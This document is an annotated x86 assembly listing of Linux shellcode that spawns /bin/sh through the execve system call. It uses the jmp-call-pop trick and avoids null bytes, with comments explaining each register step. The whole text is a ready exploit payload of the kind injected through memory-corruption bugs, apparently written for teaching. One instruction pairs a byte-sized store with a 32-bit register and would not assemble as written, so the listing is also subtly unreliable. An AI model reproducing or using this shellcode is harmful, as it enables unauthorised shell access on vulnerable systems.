jmp want_bin_bash;

got_bin_bash:;


pop ebx;  // ebx = /bin/sh/@
xor eax, eax;  // setting eax to 0 without actually writing 0
mov byte ptr [ebx+7], eax;  // ebx = /bin/sh\0 now we're done with ebx

push eax;  // push null
mov edx, esp;  // making the envp[null]. now we're done with edx

push ebx;  // setting the argv[]
mov ecx, esp;  // we're now done with ecx. argv["/bin/sh", null]

mov al, 0x0b;  // eax stores the value of execve, now we're done with eax. must write al and not eax othewrise the code will contain 0's
int 0x80;

want_bin_bash:;
call got_bin_bash;
.ASCII "/bin/sh@";